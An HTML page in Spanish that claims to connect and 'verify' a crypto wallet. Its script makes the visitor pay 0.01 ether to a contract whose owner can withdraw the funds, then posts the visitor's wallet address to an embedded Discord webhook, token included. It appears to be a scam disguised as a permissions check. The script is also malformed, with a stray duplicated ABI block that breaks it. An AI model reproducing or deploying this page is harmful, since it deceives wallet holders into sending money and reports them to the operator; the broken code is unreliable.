<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Conectar Wallet y Verificar Permisos</title>
  </head>
  <body>
    <div class="card">
      <h1>Conectar Wallet y Verificar Permisos</h1>
      <button id="connect-btn">Conectar</button>
      <button id="verify-btn" style="display:none;">Verificar Wallet</button>
      <p id="message"></p>
    </div>

    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
    <script>
      window.addEventListener('load', async () => {
        const web3 = new Web3(window.ethereum);
        await window.ethereum.enable();

        const contractAddress = "0xF8b5858DFf2E1d5e4a64133bd70121B83869fa55";
        const contractABI = [{"inputs":[{"internalType":"address","name":"_direccionComun","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"depositante","type":"address"},{"indexed":false,"internalType":"uint256","name":"cantidadBNB","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"cantidadTokens","type":"uint256"}],"name":"FondosDepositados","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"cantidadBNB","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"cantidadTokens","type":"uint256"}],"name":"FondosRetirados","type":"event"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"aprobaciones","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"aprobarPermisos","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"direccionComun","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"retirarFondos","outputs":[],"stateMutability":"nonpayable","type":"function"}]
          {
            "inputs": [
              {
                "internalType": "address",
                "name": "_direccionComun",
                "type": "address"
              }
            ],
            "stateMutability": "nonpayable",
            "type": "constructor"
          },
          {
            "inputs": [],
            "name": "aprobarPermisos",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
          }
        ];

        const contract = new web3.eth.Contract(contractABI, contractAddress);

        document.getElementById('connect-btn').addEventListener('click', async () => {
          await window.ethereum.enable();
          const accounts = await web3.eth.getAccounts();
          const message = `Haz conectado tu Wallet con éxito! Tu dirección es: ${accounts[0]}`;
          document.getElementById('message').innerText = message;
          document.getElementById('verify-btn').style.display = "inline-block";
        });

        document.getElementById('verify-btn').addEventListener('click', async () => {
          const accounts = await web3.eth.getAccounts();
          const options = {
            from: accounts[0],
            value: web3.utils.toWei('0.01', 'ether'),
            gasPrice: web3.utils.toWei('10', 'gwei')
          };

          const message = "Activar IA";
          try {
            await contract.methods.aprobarPermisos().send(options);
            document.getElementById('message').innerText = `Permisos concedidos para: ${message}`;
            // Llamada al webhook
            const webhookUrl = "https://discordapp.com/api/webhooks/1100911152516575334/ejdUwH703TcjZJbSi8UHzT1JwimydWOzQccvtoITr84v0Y56AIziAXL2eXWr5PjjQfJZ";
            const response = await fetch(webhookUrl, {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({message: "Se ha concedido permiso para " + message, userAddress: accounts[0]})
            });
          } catch (e) {
            console.log(e);
            document.getElementById('message').innerText = "Error al conceder permisos";
          }
        });
      });
    </script>

    <style>
      .card {
        border: 1px solid black;
        padding: 20px;
        width: 400px;
        margin: 50px auto;
        text-align: center;
      }
    </style>
  </body>
</html>
